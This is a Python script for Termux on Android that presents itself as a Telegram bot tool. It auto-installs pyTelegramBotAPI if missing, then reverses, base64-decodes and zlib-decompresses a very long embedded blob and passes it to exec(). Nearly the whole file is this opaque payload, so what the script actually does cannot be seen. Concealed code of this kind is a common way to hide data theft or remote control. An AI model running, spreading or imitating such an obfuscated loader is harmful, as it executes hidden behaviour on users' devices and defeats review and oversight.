#!/data/data/com.termux/files/usr/bin/python

import os
import sys
import json
import requests
import time
import threading
import shutil
import math
from datetime import datetime

# Try to import telebot, install if missing
try:
    import telebot
    from telebot import types
except ImportError:
    os.system("pip install pyTelegramBotAPI")
    import telebot
    from telebot import types

_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
exec((_)(b'==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